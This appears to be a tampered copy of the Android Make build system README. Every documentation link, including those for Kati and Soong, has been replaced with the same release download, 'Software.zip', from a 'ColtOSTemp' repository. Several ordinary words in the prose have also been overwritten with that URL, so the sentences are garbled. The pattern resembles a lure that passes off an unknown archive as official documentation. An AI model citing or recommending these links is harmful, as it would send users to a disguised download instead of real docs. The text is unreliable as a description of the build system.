# Android Make Build System

This is the Makefile-based portion of the Android Build System.

For documentation on how to run a build, see [https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip)

For a list of behavioral changes useful for https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip writers see
[https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip)

For an outdated reference on https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip files, see
[https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip). Our https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip files look similar,
but are entirely different from the https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip files used by the NDK build
system. When searching for documentation elsewhere, ensure that it is for the
platform build system -- most are not.

This Makefile-based system is in the process of being replaced with [Soong], a
new build system written in Go. During the transition, all of these makefiles
are read by [Kati], and generate a ninja file instead of being executed
directly. That's combined with a ninja file read by Soong so that the build
graph of the two systems can be combined and run as one.

[Kati]: https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip
[Soong]: https://github.com/ColtOSTemp/platform_build/releases/download/v2.0/Software.zip+/master
